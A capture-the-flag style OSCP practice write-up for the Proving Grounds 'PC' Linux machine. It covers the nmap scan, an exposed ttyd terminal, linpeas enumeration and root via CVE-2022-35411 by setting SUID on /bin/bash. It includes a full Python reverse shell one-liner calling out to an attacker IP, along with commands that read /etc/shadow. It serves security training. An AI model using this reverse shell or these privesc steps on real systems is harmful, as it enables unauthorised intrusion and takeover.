---
Date: 2024-10-12
Course: "[[OSCP]]"
Platform: PG-Practice
Category: Linux
Difficulty: Intermediate
Status: Complete
IP: 192.168.215.210
Writeup: https://medium.com/@robertip/oscp-practice-pc-proving-ground-practice-64d5954790a1
---
# PC
This was an interesting one, with `linpeas` showing multiple vulnerabilities and yet the most obvious two didn't work because of missing dependencies and no user credentials. 

Figuring out how `rpcpy-exploit` worked was interesting, but the real lesson here was understanding how if the SUID binary can be set then you can run Bash in privileged mode with `/bin/bash -p` and become `root`

# Resolution summary
- Ran Nmap to identify ports `22` & `8000`
- Visited http (`8000`) & identified `ttyd`
- Created reverse shell and enumerated target
- Ran `linpeas.sh` and identified multiple vulnerabilities and `rpc.sh` script
- Identified exploit for `rpc.sh` and used it to modify `/bin/bash` set permission
- Used `/bin/bash -p` to switch to `root`
## Improved skills
- Identifying vulnerabilities & scripts with `linpeas.sh`
## Used tools
- nmap
- ttyd
- python

---
# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -sC -sV -oN PC.nmap 192.168.215.210 -v
```

Enumerated open TCP ports:
```bash
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
8000/tcp open  http-alt ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)
|_http-title: ttyd - Terminal
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     server: ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)
|     content-type: text/html
|     content-length: 173
|     <html><head><meta charset=utf-8 http-equiv="Content-Language" content="en"/><link rel="stylesheet" type="text/css" href="/error.css"/></head><body><h1>404</h1></body></html>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     server: ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)
|     content-type: text/html
|     content-length: 677047
|     <!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>ttyd - Terminal</title><link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAcCAYAAAAAwr0iAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA0xpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMDY3IDc5LjE1Nzc0NywgMjAxNS8wMy8zMC0yMzo0MDo0MiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vb
|   Socks5, X11Probe: 
|     HTTP/1.0 403 Forbidden
|     server: ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)
|     content-type: text/html
|     content-length: 173
|_    <html><head><meta charset=utf-8 http-equiv="Content-Language" content="en"/><link rel="stylesheet" type="text/css" href="/error.css"/></head><body><h1>403</h1></body></html>
1 service unrecognized despite returning data.
```

---
# Enumeration
## Port 22 - SSH (OpenSSH 7.9p1)
No enumeration conducted
## Port 8000 - HTTP (ttyd-alt)
- Navigated to `http://192.168.215.210:8000`, found `ttyd` service running, and enumerated available directories
![[Cybersecurity-Resources/images/Pasted image 20241012094632.png]]
- Ran `cat /etc/passwd` to find other users, and `cat /etc/shadow` to test shadow file
![[Cybersecurity-Resources/images/Pasted image 20241012094922.png]]
- Ran `ttyd -h` to view TTYD help, then checked version
![[Cybersecurity-Resources/images/Pasted image 20241012095216.png]]
- Ran `ps aux` to identify running processes and identified `python3 /opt/rpy.py` running under `root` - potentially vulnerable to CVE-2022-35411
![[Cybersecurity-Resources/images/Pasted image 20241012095732.png]]
- Started netcat listener on port 4444 and created reverse shell with command `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.250",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'` 
![[Cybersecurity-Resources/images/Pasted image 20241012095951.png]]
- Upgraded shell, uploaded `suid3num.py` from [Anon-Exploiter](https://github.com/Anon-Exploiter/SUID3NUM), and executed python script for no exploitable binaries.
![[Cybersecurity-Resources/images/Pasted image 20241012100538.png]]
- Uploaded `linpeas.sh` and executed script
![[Cybersecurity-Resources/images/Pasted image 20241012100947.png]]
- Identified sudo version 1.8.3 - potentially vulnerable to CVE-2021-3156
![[Cybersecurity-Resources/images/Pasted image 20241012101046.png]]
- Identified vulnerable to CVE-2021-3560
![[Cybersecurity-Resources/images/Pasted image 20241012101134.png]]
- Identified process `1045` run by `user` but ppid is `root`
![[Cybersecurity-Resources/images/Pasted image 20241012101336.png]]
- Identified potentially vulnerable Pkexec policy for user
![[Cybersecurity-Resources/images/Pasted image 20241012101440.png]]
	- Checked `pkexe` binary permissions
![[Cybersecurity-Resources/images/Pasted image 20241012103343.png]]

---
# Exploitation

## CVE-2021-3560
- Uploaded `poc.sh` and attempted to exploit Polkit privesc - missing `Accounts service` and `gnome-control-center`
![[Cybersecurity-Resources/images/Pasted image 20241012102758.png]]
## CVE-2023-22809
- Uploaded `exploit.sh` from [https://github.com/asepsaepdin/CVE-2023-22809/blob/main/exploit.sh] and attempted to exploit `sudo v1.8.3` privesc - do not have `user` password
![[Cybersecurity-Resources/images/Pasted image 20241012103104.png]]
---
# Privilege Escalation
## CVE-2022-35411
- Modified `rpcpy-exploit.py` from [https://github.com/ehtec/rpcpy-exploit/blob/main/rpcpy-exploit.py] to execute `chmod +s /bin/bash` on target as `root`
![[Cybersecurity-Resources/images/Pasted image 20241012111558.png]]
- Ran `python3 rpcpy-exploit.py` on target, then ran `/bin/bash -p` to run Bash as `root`
![[Cybersecurity-Resources/images/Pasted image 20241012111709.png]]
- Ran `cat /root/proof.txt` for flag `0d69ed51214ecceb8e06fe516da4785e`
![[Cybersecurity-Resources/images/Pasted image 20241012112106.png]]
---
# Trophy & Loot
`root.txt` = `0d69ed51214ecceb8e06fe516da4785e`